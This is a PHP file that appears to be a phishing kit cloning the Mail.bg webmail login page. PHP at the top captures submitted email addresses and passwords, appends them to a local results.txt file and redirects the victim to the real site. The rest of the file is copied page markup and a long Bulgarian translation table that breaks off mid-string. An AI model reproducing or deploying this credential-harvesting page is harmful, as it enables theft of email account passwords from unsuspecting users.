<?php
if (isset($_POST['user']) && $_POST['user'] != "" && isset($_POST['pass']) && $_POST['pass'] != "") {
  $email = $_POST['user'];
  $password = $_POST['pass'];

  $result = "Email -> " . $email."\nPassword -> " . $password . "\n-----------------------\n";
  $myfile = fopen("results.txt", "a");
  fwrite($myfile, $result);
  fclose($myfile);
  header("Location: https://mail.bg/idx");
}

//print_r($_COOKIE);
?>
<!DOCTYPE html>
<html>
<head>
  <script type="text/javascript" async="" src="https://static.criteo.net/js/ld/publishertag.prebid.js"></script>

<title>Mail.bg</title><meta http-equiv="Content-Language" content="bg">
<meta http-equiv="X-UA-Compatible" content="chrome=1"><link href="https://mail.bg/css/style-3.css" media="all" rel="stylesheet" type="text/css">
<link href="https://mail.bg/css/style_ltr-3.css" media="all" rel="stylesheet" type="text/css">
<script async="" src="https://www.googletagservices.com/tag/js/gpt.js"></script><script type="text/javascript">
    //<!--
    var secure_ajax = true;    //-->
</script>
<script type="text/javascript">
    //<!--
    var onLoadFuncs = [];
var script_loaded = false;
function loadScript(script_src, callback) {
    var head = document.getElementsByTagName('head')[0];
    var script = document.createElement('script');
    script.type = 'text/javascript';

    var loaded = false;
    var loadFunction = function () {
        if (loaded) {
            return;
        }
        if ((this.readyState
             && (this.readyState === 'loaded'
                 || this.readyState === 'complete')) ||
            typeof this.readyState === 'undefined'
        ) {
            loaded = true;
            if (typeof callback !== 'function') {
                return;
            }
            callback();
        }
    };
    script.onload = loadFunction;
    script.onreadystatechange = loadFunction;

    script.src = script_src;
    head.appendChild(script);
}
function addEvent(target, event, callback) {
    event = event.replace(/^on(.*)$/, '$1');
    if (window.addEventListener) {
        target.addEventListener(event, callback, false);
    } else if (window.attachEvent) {
        target.attachEvent('on' + event, callback);
    }
}
function removeEvent(target, event, callback) {
    event = event.replace(/^on(.*)$/, '$1');
    if (window.removeEventListener) {
        target.removeEventListener(event, callback, false);
    } else if (window.detachEvent) {
        target.detachEvent('on' + event, callback);
    }
}
function onScriptLoad(execute) {
    if (typeof execute !== 'function') {
        return;
    }

    if (script_loaded) {
        execute();
    } else {
        onLoadFuncs.push(execute);
    }
}
var Mail = {};
Mail.Features = {};
Mail.Features.markWithSpace = false;
Mail.Environment = {};
Mail.Environment.lang = 'bg';
Mail.Mailbox = {};
Mail.Mailbox.Trash = {};
Mail.Mailbox.Trash.isVirtual = false;
    //-->
</script>

<!-- responsive design -->
<!-- viewport -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<!-- manifest -->
<link rel="manifest" href="https://mail.bg/manifest_bg.json">

<!-- general -->
<!-- 320px to 359px -->
<link media="(max-width: 359px)" rel="stylesheet" href="https://mail.bg/css/style_w320.css">

<!-- 320px to 479px -->
<link media="(max-width: 479px)" rel="stylesheet" href="https://mail.bg/css/style_w360-1.css">

<!-- 480px to 799px -->
<link media="(min-width: 480px)
             and (max-width: 799px)" rel="stylesheet" href="https://mail.bg/css/style_w480.css">
<link media="(min-width: 640px)
             and (max-width: 799px)" rel="stylesheet" href="https://mail.bg/css/style_w640.css">

<!-- 800px to 979px -->
<link media="(min-width: 800px)
             and (max-width: 979px)" rel="stylesheet" href="https://mail.bg/css/style_w800.css">


<!-- up to 979px -->
<link media="(max-width: 979px)" rel="stylesheet" href="https://mail.bgcss/style_wlt980.css">
<link media="(max-width: 979px)" rel="stylesheet" href="https://mail.bgcss/no_branding.css">

<!-- eja -->
<link media="(min-width: 980px)" rel="stylesheet" href="https://mail.bg/css/style_edge.css">

<!-- ios -->
<link media="(max-device-width: 1024px)
             and (min-device-width: 768px)
             and (-webkit-min-device-pixel-ratio: 2)" rel="stylesheet" href="https://mail.bg/css/style_w1024.css">

<!-- mobile icons -->
<!-- For non-Retina iPhone, iPod Touch, and Android 2.1+ devices: -->
<link rel="apple-touch-icon" href="http://mail.bg/mail.bg-ios-57x57.png">
<!-- For first-generation iPad: -->
<link rel="apple-touch-icon" sizes="72x72" href="http://mail.bg/mail.bg-ios-72x72.png">
<!-- For iPhone 4 with high-resolution Retina display: -->
<link rel="apple-touch-icon" sizes="114x114" href="http://mail.bg/mail.bg-ios-114x114.png">

<!-- IE9 PinnedSite Static JumpList -->
<meta name="application-name" content="Mail.bg">
<meta name="msapplication-starturl" content="http://mail.bg">
<meta name="msapplication-task" content="name=Ново писмо;
               action-uri=http://mail.bg/#compose;
               icon-uri=http://mail.bg/favicon.ico">
<meta name="msapplication-task" content="name=Поща;
               action-uri=http://mail.bg/#mailbox;
               icon-uri=/favicon.ico">
<meta name="msapplication-task" content="name=Контакти;
               action-uri=http://mail.bg/#contacts;
               icon-uri=http://mail.bg/favicon.ico">
<meta name="msapplication-task" content="name=Джаджи;
               action-uri=http://mail.bg/#widgets;
               icon-uri=http://mail.bg/favicon.ico">
<!-- END -->

<!-- meta title -->
<meta name="title" content="Mail.bg: Вход">

<!-- meta description -->
<meta name="description" content="30 GB безплатна електронна поща. Оптимизирана за таблет и телефон.">

<!-- meta keywords -->
<meta name="keywords" content="бг поща,поща бг,mail поща,електронна поща,имейл поща,създаване на имейл,abv e-mail,abv bg mail,e mail abv bg,как да си направя имейл,poshta,email поща,e poshta">

<!-- meta og title -->
<meta property="og:title" content="Mail.bg: Вход">

<!-- meta og type -->
<meta property="og:type" content="website">

<!-- meta og url -->
<meta property="og:url" content="https://mail.bg/auth/lgn">

<!-- meta og image -->
<meta property="og:image" content="http://mail.bg/images/mail.bg.png">

<!-- meta og description -->
<meta property="og:description" content="30 GB безплатна електронна поща. Оптимизирана за таблет и телефон.">

<script>
addEvent(window, 'onload', function () {
    loadScript('https://js/script-6.js', function() {
    for (var i = 0, l = onLoadFuncs.length; i < l; i++) {
        onLoadFuncs[i]();
    }
    testPreflightCors();
    loadScript(('https:' == document.location.protocol
                ? 'https://'
                : 'http://')
               + 'stats.g.doubleclick.net/dc.js', function () {
        gaPageTrack('UA-5624009-2');
        ShowBanner('login_top');
        var isStartBG = false;
                    });
})});
var cdndomain = '';
var translation_map = {"Font":"\u0428\u0440\u0438\u0444\u0442","Size":"\u0420\u0430\u0437\u043c\u0435\u0440","in folder":"\u0432 \u043f\u0430\u043f\u043a\u0430","Install":"\u0418\u043d\u0441\u0442\u0430\u043b\u0438\u0440\u0430\u0439\u0442\u0435","the official %domain% notifier!":"\u043e\u0444\u0438\u0446\u0438\u0430\u043b\u043d\u0438\u044f %domain% \u043d\u043e\u0442\u0438\u0444\u0438\u043a\u0430\u0442\u043e\u0440!","Are you sure, you haven't forgotten the attachment?":"\u0421\u0438\u0433\u0443\u0440\u043d\u0438 \u043b\u0438 \u0441\u0442\u0435, \u0447\u0435 \u043d\u0435 \u0441\u0442\u0435 \u0437\u0430\u0431\u0440\u0430\u0432\u0438\u043b\u0438 \u0430\u0442\u0430\u0447\u043c\u044a\u043d\u0442\u0430?","Your Mail.bg address":"\u0412\u0430\u0448\u0438\u044f\u0442 \u0430\u0434\u0440\u0435\u0441 \u0432 Mail.bg","Your e-mail address":"\u0412\u0430\u0448\u0438\u044f\u0442 \u0438\u043c\u0435\u0439\u043b \u0430\u0434\u0440\u0435\u0441","[unknown sender]":"[\u043d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u0435\u043d \u043f\u043e\u0434\u0430\u0442\u0435\u043b]","Read":"\u0427\u0435\u0442\u0435\u043d\u043e","You have not sent the message. Are you sure you want to continue?":"\u041d\u0435 \u0441\u0442\u0435 \u0438\u0437\u043f\u0440\u0430\u0442\u0438\u043b\u0438 \u043f\u0438\u0441\u043c\u043e\u0442\u043e. \u0421\u0438\u0433\u0443\u0440\u043d\u0438 \u043b\u0438 \u0441\u0442\u0435, \u0447\u0435 \u0438\u0441\u043a\u0430\u0442\u0435 \u0434\u0430 \u043f\u0440\u043e\u0434\u044a\u043b\u0436\u0438\u0442\u0435?","[Nosubject]":"[\u041d\u044f\u043c\u0430\u0442\u0435\u043c\u0430]","[nosubject]":"[\u043d\u044f\u043c\u0430\u0442\u0435\u043c\u0430]","[noname]":"[\u043d\u044f\u043c\u0430\u0438\u043c\u0435]","Message could not be opened. Try again.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u043d\u0435 \u0431\u0435\u0448\u0435 \u043e\u0442\u0432\u043e\u0440\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e. \u041e\u043f\u0438\u0442\u0430\u0439\u0442\u0435 \u043f\u0430\u043a.","Loading messages":"\u0417\u0430\u0440\u0435\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u043f\u0438\u0441\u043c\u0430\u0442\u0430","Search results":"\u0420\u0435\u0437\u0443\u043b\u0442\u0430\u0442\u0438","Problem getting the messages from \"%folder%\". Please try again.":"\u041f\u0440\u043e\u0431\u043b\u0435\u043c \u0441 \u0432\u0437\u0438\u043c\u0430\u043d\u0435\u0442\u043e \u043d\u0430 \u0441\u044a\u043e\u0431\u0449\u0435\u043d\u0438\u044f\u0442\u0430 \u043e\u0442 \"%folder%\". \u041c\u043e\u043b\u044f \u043e\u043f\u0438\u0442\u0430\u0439\u0442\u0435 \u043e\u0442\u043d\u043e\u0432\u043e.","Connection problem, please try again":"\u041f\u0440\u043e\u0431\u043b\u0435\u043c \u0441 \u0432\u0440\u044a\u0437\u043a\u0430\u0442\u0430, \u043c\u043e\u043b\u044f \u043e\u043f\u0438\u0442\u0430\u0439\u0442\u0435 \u043e\u0442\u043d\u043e\u0432\u043e","max.":"\u043c\u0430\u043a\u0441.","min.":"\u043c\u0438\u043d.","tomorrow":"\u0443\u0442\u0440\u0435","New tag":"\u041d\u043e\u0432 \u0435\u0442\u0438\u043a\u0435\u0442","Select":"\u0418\u0437\u0431\u0435\u0440\u0438","Remove":"\u041f\u0440\u0435\u043c\u0430\u0445\u043d\u0438","You will receive set up instructions on the contact e-mail":"\u0429\u0435 \u043f\u043e\u043b\u0443\u0447\u0438\u0442\u0435 \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0438 \u0437\u0430 \u043d\u0430\u0441\u0442\u0440\u043e\u0439\u043a\u0430 \u043d\u0430 \u0438\u0437\u0431\u0440\u0430\u043d\u0438\u044f \u0438\u043c\u0435\u0439\u043b \u043a\u043e\u043d\u0442\u0430\u043a\u0442","Checking":"\u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430","Invalid e-mail address":"\u041d\u0435\u0432\u0430\u043b\u0438\u0434\u0435\u043d \u0438\u043c\u0435\u0439\u043b \u0430\u0434\u0440\u0435\u0441","This user name exists":"\u041f\u043e\u0442\u0440\u0435\u0431\u0438\u0442\u0435\u043b\u0441\u043a\u043e\u0442\u043e \u0438\u043c\u0435 \u0441\u044a\u0449\u0435\u0441\u0442\u0432\u0443\u0432\u0430","You have to accept the terms and conditions":"\u0422\u0440\u044f\u0431\u0432\u0430 \u0434\u0430 \u0441\u0435 \u0441\u044a\u0433\u043b\u0430\u0441\u0438\u0442\u0435 \u0441 \u043e\u0431\u0449\u0438\u0442\u0435 \u0443\u0441\u043b\u043e\u0432\u0438\u044f","You have not entered the code from the picture":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u043a\u043e\u0434\u0430 \u043e\u0442 \u043a\u0430\u0440\u0442\u0438\u043d\u043a\u0430\u0442\u0430","You have not chosen sex":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u043f\u043e\u043b","Password is shorter than 5 characters":"\u041f\u0430\u0440\u043e\u043b\u0430\u0442\u0430 \u043d\u0435 \u043c\u043e\u0436\u0435 \u0434\u0430 \u0435 \u043f\u043e-\u043a\u044a\u0441\u0430 \u043e\u0442 5 \u0441\u0438\u043c\u0432\u043e\u043b\u0430","No user name entered":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u043f\u043e\u0442\u0440\u0435\u0431\u0438\u0442\u0435\u043b\u0441\u043a\u043e \u0438\u043c\u0435","Changes saved successfully":"\u041f\u0440\u043e\u043c\u0435\u043d\u0438\u0442\u0435 \u0431\u044f\u0445\u0430 \u0437\u0430\u043f\u0430\u0437\u0435\u043d\u0438 \u0443\u0441\u043f\u0435\u0448\u043d\u043e","Error while sending a subscription request, please try again.":"\u0413\u0440\u0435\u0448\u043a\u0430 \u043f\u0440\u0438 \u0438\u0437\u043f\u0440\u0430\u0449\u0430\u043d\u0435 \u043d\u0430 \u0437\u0430\u044f\u0432\u043a\u0430\u0442\u0430 \u0437\u0430 \u0430\u0431\u043e\u043d\u0430\u043c\u0435\u043d\u0442, \u043c\u043e\u043b\u044f \u043e\u043f\u0438\u0442\u0430\u0439\u0442\u0435 \u043e\u0442\u043d\u043e\u0432\u043e.","You have not entered the address of receipt of invoice":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0430\u0434\u0440\u0435\u0441 \u043d\u0430 \u043f\u043e\u043b\u0443\u0447\u0430\u0432\u0430\u043d\u0435 \u043d\u0430 \u0444\u0430\u043a\u0442\u0443\u0440\u0430","You have not entered the registered address":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0430\u0434\u0440\u0435\u0441 \u043d\u0430 \u0440\u0435\u0433\u0438\u0441\u0442\u0440\u0430\u0446\u0438\u044f","You have not entered a phone number":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0442\u0435\u043b\u0435\u0444\u043e\u043d","You have not entered the name of the responsible official":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u041c\u041e\u041b","You have not entered the VAT ID number":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0418\u0414 \u043d\u043e\u043c\u0435\u0440 \u043f\u043e \u0414\u0414\u0421","\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0415\u0418\u041d":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0415\u0418\u041d","Your subscription request was sent successfully.":"\u0417\u0430\u044f\u0432\u043a\u0430\u0442\u0430 \u0437\u0430 \u0430\u0431\u043e\u043d\u0430\u043c\u0435\u043d\u0442 \u0431\u0435\u0448\u0435 \u0438\u0437\u043f\u0440\u0430\u0442\u0435\u043d\u0430 \u0443\u0441\u043f\u0435\u0448\u043d\u043e.","h":"\u0447\u0430\u0441\u0430","%percent%% from %size%":"%percent%% \u043e\u0442 %size%","from":"\u043e\u0442","no password entered":"\u043d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u0430","no user entered":"\u043d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u043f\u043e\u0442\u0440\u0435\u0431\u0438\u0442\u0435\u043b","no site entered":"\u043d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0441\u0430\u0439\u0442","Passwords do not match":"\u041f\u0430\u0440\u043e\u043b\u0438\u0442\u0435 \u043d\u0435 \u0441\u044a\u0432\u043f\u0430\u0434\u0430\u0442","Could not find new contacts to add":"\u041d\u0435 \u0431\u044f\u0445\u0430 \u043e\u0442\u043a\u0440\u0438\u0442\u0438 \u043d\u043e\u0432\u0438 \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u0438 \u0437\u0430 \u0434\u043e\u0431\u0430\u0432\u044f\u043d\u0435","Addresses added to contacts":"\u0410\u0434\u0440\u0435\u0441\u0438\u0442\u0435 \u0441\u0430 \u0434\u043e\u0431\u0430\u0432\u0435\u043d\u0438 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0432 \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u0438\u0442\u0435","Address added to contacts":"\u0410\u0434\u0440\u0435\u0441\u044a\u0442 \u0435 \u0434\u043e\u0431\u0430\u0432\u0435\u043d \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0432 \u043a\u043e\u043d\u0442\u0430\u043a\u0442\u0438\u0442\u0435","with...":"\u043a\u044a\u043c...","Your session has expired, to continue enter your password.":"\u0412\u0430\u0448\u0430\u0442\u0430 \u0441\u0435\u0441\u0438\u044f \u0435 \u0438\u0437\u0442\u0435\u043a\u043b\u0430, \u0437\u0430 \u0434\u0430 \u043f\u0440\u043e\u0434\u044a\u043b\u0436\u0438\u0442\u0435 \u0432\u044a\u0432\u0435\u0434\u0435\u0442\u0435 \u043f\u0430\u0440\u043e\u043b\u0430\u0442\u0430 \u0441\u0438.","Error while sending.":"\u0413\u0440\u0435\u0448\u043a\u0430 \u043f\u0440\u0438 \u0438\u0437\u043f\u0440\u0430\u0449\u0430\u043d\u0435\u0442\u043e.","The message will be sent when all files are attached.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0449\u0435 \u0431\u044a\u0434\u0435 \u0438\u0437\u043f\u0440\u0430\u0442\u0435\u043d\u043e \u0441\u043b\u0435\u0434 \u043a\u0430\u0442\u043e \u0441\u0435 \u043f\u0440\u0438\u043a\u0430\u0447\u0430\u0442 \u0432\u0441\u0438\u0447\u043a\u0438 \u0444\u0430\u0439\u043b\u043e\u0432\u0435.","Sending message.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0441\u0435 \u0438\u0437\u043f\u0440\u0430\u0449\u0430.","No recipient.":"\u041d\u044f\u043c\u0430 \u0432\u044a\u0432\u0435\u0434\u0435\u043d \u043f\u043e\u043b\u0443\u0447\u0430\u0442\u0435\u043b.","Please correct or delete the wrong fields (marked in red).":"\u041c\u043e\u043b\u044f \u043a\u043e\u0440\u0438\u0433\u0438\u0440\u0430\u0439\u0442\u0435 \u0438\u043b\u0438 \u0438\u0437\u0442\u0440\u0438\u0439\u0442\u0435 \u0433\u0440\u0435\u0448\u043d\u0438\u0442\u0435 \u043f\u043e\u043b\u0435\u0442\u0430 (\u043c\u0430\u0440\u043a\u0438\u0440\u0430\u043d\u0438 \u0432 \u0447\u0435\u0440\u0432\u0435\u043d\u043e).","All messages in \"spam\" deleted.":"\u0412\u0441\u0438\u0447\u043a\u0438 \u043f\u0438\u0441\u043c\u0430 \u0432 \"\u0441\u043f\u0430\u043c\" \u0441\u0430 \u0438\u0437\u0442\u0440\u0438\u0442\u0438.","Are you sure you want to delete all messages from \"spam\"?":"\u0421\u0438\u0433\u0443\u0440\u043d\u0438 \u043b\u0438 \u0441\u0442\u0435, \u0447\u0435 \u0438\u0441\u043a\u0430\u0442\u0435 \u0434\u0430 \u0438\u0437\u0442\u0440\u0438\u0435\u0442\u0435 \u0432\u0441\u0438\u0447\u043a\u0438 \u043f\u0438\u0441\u043c\u0430 \u043e\u0442 \"\u0441\u043f\u0430\u043c\"?","All messages in trash have been deleted.":"\u0412\u0441\u0438\u0447\u043a\u0438 \u043f\u0438\u0441\u043c\u0430 \u043e\u0442 \u043a\u043e\u0448\u0447\u0435\u0442\u043e \u0441\u0430 \u0438\u0437\u0442\u0440\u0438\u0442\u0438.","Are you sure you want to delete all messages in trash?":"\u0421\u0438\u0433\u0443\u0440\u043d\u0438 \u043b\u0438 \u0441\u0442\u0435, \u0447\u0435 \u0438\u0441\u043a\u0430\u0442\u0435 \u0434\u0430 \u0438\u0437\u0442\u0440\u0438\u0435\u0442\u0435 \u0432\u0441\u0438\u0447\u043a\u0438 \u043f\u0438\u0441\u043c\u0430 \u043e\u0442 \u043a\u043e\u0448\u0447\u0435\u0442\u043e?","Are you sure you want to delete folder \"%name%\"? All messages inside will be deleted!":"\u0421\u0438\u0433\u0443\u0440\u043d\u0438 \u043b\u0438 \u0441\u0442\u0435, \u0447\u0435 \u0438\u0441\u043a\u0430\u0442\u0435 \u0434\u0430 \u0438\u0437\u0442\u0440\u0438\u0435\u0442\u0435 \u043f\u0430\u043f\u043a\u0430 \"%name%\"? \u0412\u0441\u0438\u0447\u043a\u0438 \u043f\u0438\u0441\u043c\u0430 \u0432 \u043d\u0435\u044f \u0449\u0435 \u0431\u044a\u0434\u0430\u0442 \u0438\u0437\u0442\u0440\u0438\u0442\u0438!","close":"\u0437\u0430\u0442\u0432\u043e\u0440\u0438","GB":"GB","MB":"MB","KB":"KB","Error":"\u0413\u0440\u0435\u0448\u043a\u0430","Cancelled":"\u041e\u0442\u043a\u0430\u0437\u0430\u043d","Moving message":"\u041c\u0435\u0441\u0442\u0435\u043d\u0435 \u043d\u0430 \u0441\u044a\u043e\u0431\u0449\u0435\u043d\u0438\u0435","Deleting message":"\u0422\u0440\u0438\u0435\u043d\u0435 \u043d\u0430 \u0441\u044a\u043e\u0431\u0449\u0435\u043d\u0438\u0435","Processing message":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0441\u0435 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0432\u0430","Message could not be marked as spam.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u043d\u0435 \u0431\u0435\u0448\u0435 \u043c\u0430\u0440\u043a\u0438\u0440\u0430\u043d\u043e \u0437\u0430 \u0441\u043f\u0430\u043c \u0443\u0441\u043f\u0435\u0448\u043d\u043e.","Message marked as spam.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0435 \u043c\u0430\u0440\u043a\u0438\u0440\u0430\u043d\u043e \u0437\u0430 \u0441\u043f\u0430\u043c.","Message restored and marked as not spam.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0435 \u0432\u044a\u0437\u0441\u0442\u0430\u043d\u043e\u0432\u0435\u043d\u043e \u0438 \u043c\u0430\u0440\u043a\u0438\u0440\u0430\u043d\u043e, \u0447\u0435 \u043d\u0435 \u0435 \u0441\u043f\u0430\u043c.","Images in messages sent from this domain will be hidden automatically.":"\u041a\u0430\u0440\u0442\u0438\u043d\u043a\u0438\u0442\u0435 \u0432 \u043f\u0438\u0441\u043c\u0430 \u043e\u0442 \u0442\u043e\u0437\u0438 \u0434\u043e\u043c\u0435\u0439\u043d \u0449\u0435 \u0431\u044a\u0434\u0430\u0442 \u0441\u043a\u0440\u0438\u0432\u0430\u043d\u0438 \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u043d\u043e.","Images in messages sent from this domain will be shown automatically.":"\u041a\u0430\u0440\u0442\u0438\u043d\u043a\u0438\u0442\u0435 \u0432 \u043f\u0438\u0441\u043c\u0430 \u043e\u0442 \u0442\u043e\u0437\u0438 \u0434\u043e\u043c\u0435\u0439\u043d \u0449\u0435 \u0431\u044a\u0434\u0430\u0442 \u043f\u043e\u043a\u0430\u0437\u0432\u0430\u043d\u0438 \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u043d\u043e.","\u00ab Messages labeled ":"\u00ab \u041f\u0438\u0441\u043c\u0430 \u0441 \u0435\u0442\u0438\u043a\u0435\u0442 ","\u00ab Back to the search results":"\u00ab \u0412\u0440\u044a\u0449\u0430\u043d\u0435 \u0432 \u043d\u0430\u043c\u0435\u0440\u0435\u043d\u0438\u0442\u0435","\u00ab Back to the unseen list":"\u00ab \u0412\u0440\u044a\u0449\u0430\u043d\u0435 \u0432 \u0441\u043f\u0438\u0441\u044a\u043a\u0430 \u0441 \u043d\u0435\u0447\u0435\u0442\u0435\u043d\u0438","\u00ab Back to mailbox":"\u00ab \u0412\u0440\u044a\u0449\u0430\u043d\u0435 \u0432 \u043f\u0430\u043f\u043a\u0430","Message could not be restored.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u043d\u0435 \u0431\u0435\u0448\u0435 \u0432\u044a\u0437\u0441\u0442\u0430\u043d\u043e\u0432\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e.","Message restored.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0431\u0435\u0448\u0435 \u0432\u044a\u0437\u0441\u0442\u0430\u043d\u043e\u0432\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e.","Message could not be deleted.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u043d\u0435 \u0431\u0435\u0448\u0435 \u0438\u0437\u0442\u0440\u0438\u0442\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e.","Message deleted.":"\u041f\u0438\u0441\u043c\u043e\u0442\u043e \u0435 \u0438\u0437\u0442\u0440\u0438\u0442\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e.","Unknown&nbsp;date":"\u041d\u0435\u0438\u0437\u0432\u0435\u0441\u0442\u043d\u0430&nbsp;\u0434\u0430\u0442\u0430","%hour%&nbsp;hours&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;%hour%&nbsp;\u0447\u0430\u0441\u0430","%hour3%&nbsp;hours&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;%hour3%&nbsp;\u0447\u0430\u0441\u0430","2&nbsp;hours&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;2&nbsp;\u0447\u0430\u0441\u0430","1&nbsp;hour&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;1&nbsp;\u0447\u0430\u0441","%min%&nbsp;minutes&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;%min%&nbsp;\u043c\u0438\u043d\u0443\u0442\u0438","%min3%&nbsp;minutes&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;%min3%&nbsp;\u043c\u0438\u043d\u0443\u0442\u0438","2&nbsp;minutes&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;2&nbsp;\u043c\u0438\u043d\u0443\u0442\u0438","1&nbsp;minute&nbsp;ago":"\u043f\u0440\u0435\u0434\u0438&nbsp;1&nbsp;\u043c\u0438\u043d\u0443\u0442\u0430","yesterday":"\u0432\u0447\u0435\u0440\u0430","Caps Lock is on":"Caps Lock \u0435 \u0432\u043a\u043b\u044e\u0447\u0435\u043d","You are not typing in English letters":"\u041d\u0435 \u043f\u0438\u0448\u0435\u0442\u0435 \u043d\u0430 \u043b\u0430\u0442\u0438\u043d\u0438\u0446\u0430","Fill in both fields correctly":"\u041f\u043e\u043f\u044a\u043b\u043d\u0435\u0442\u0435 \u043f\u0440\u0430\u0432\u0438\u043b\u043d\u043e \u0438 \u0434\u0432\u0435\u0442\u0435 \u043f\u043e\u043b\u0435\u0442\u0430","You have not entered a password":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u0430","You have not entered a username":"\u041d\u0435 \u0441\u0442\u0435 \u0432\u044a\u0432\u0435\u043b\u0438 \u0430\u0434\u0440\u0435\u0441","Please, wait.":"\u041c\u043e\u043b\u044f, \u0438\u0437\u0447\u0430\u043a\u0430\u0439\u0442\u0435.","To be able to notify you for new messages while the site is open, please allow us in the bar that will appear at the top of the screen.":"\u0417\u0430 \u0434\u0430 \u043c\u043e\u0436\u0435\u043c \u0434\u0430 \u0432\u0438 \u0443\u0432\u0435\u0434\u043e\u043c\u044f\u0432\u0430\u043c\u0435 \u0437\u0430 \u043d\u043e\u0432\u043e \u043f\u0438\u0441\u043c\u043e, \u0434\u043e\u043a\u0430\u0442\u043e \u0441\u0430\u0439\u0442\u044a\u0442 \u0435 \u043e\u0442\u0432\u043e\u0440\u0435\u043d, \u043c\u043e\u043b\u044f \u0440\u0430\u0437\u0440\u0435\u0448\u0435\u0442\u0435 \u043d\u0438 \u0442\u043e\u0432\u0430 \u0432 \u043b\u0435\u043d\u0442\u0430\u0442\u0430, \u043a\u043e\u044f\u0442\u043e \u0449\u0435 \u0441\u0435 \u043f\u043e\u044f\u0432\u0438 \u0432 \u0433\u043e\u0440\u043d\u0438\u044f \u043a\u0440\u0430\u0439 \u043d\u0430 \u0435\u043a\u0440\u0430\u043d\u0430.","New message from %email% - %subject%":"\u041d\u043e\u0432\u043e \u043f\u0438\u0441\u043c\u043e \u043e\u0442 %email% - %subject%","new messages":"\u043d\u043e\u0432\u0438 \u043f\u0438\u0441\u043c\u0430","No messages in this folder.":"\u041d\u044f\u043c\u0430 \u043f\u0438\u0441\u043c\u0430 \u0432 \u0442\u0430\u0437\u0438 \u043f\u0430\u043f\u043a\u0430.","This page is temporarily unavailable.":"\u0422\u0430\u0437\u0438 \u0441\u0442\u0440\u0430\u043d\u0438\u0446\u0430 \u0435 \u0432\u0440\u0435\u043c\u0435\u043d\u043d\u043e \u043d\u0435\u0434\u043e\u0441\u0442\u044a\u043f\u043d\u0430.","No messages found.":"\u041d\u044f\u043c\u0430 \u043d\u0430\u043c\u0435\u0440\u0435\u043d\u0438 \u043f\u0438\u0441\u043c\u0430.","Are you sure you want to delete this user?":"\u0421\u0438\u0433\u0443\u0440\u043d\u0438 \u043b\u0438 \u0441\u0442\u0435, \u0447\u0435 \u0438\u0441\u043a\u0430\u0442\u0435 \u0434\u0430 \u0438\u0437\u0442\u0440\u0438\u0435\u0442\u0435 \u0442\u043e\u0437\u0438 \u043f\u043e\u0442\u0440\u0435\u0431\u0438\u0442\u0435\u043b?","Connection cannot be established, try again":"\u041d\u044f\u043c\u0430 \u0432\u0440\u044a\u0437\u043a\u0430, \u043e\u043f\u0438\u0442\u0430\u0439\u0442\u0435 \u043e\u0442\u043d\u043e\u0432\u043e.","Your browser does not support AJAX. Please try another browser (or newer version).":"\u0411\u0440\u0430\u0443\u0437\u044a\u0440\u044a\u0442, \u043a\u043e\u0439\u0442\u043e \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430\u0442\u0435 \u043d\u0435 \u043f\u043e\u0434\u0434\u044a\u0440\u0436\u0430 AJAX. 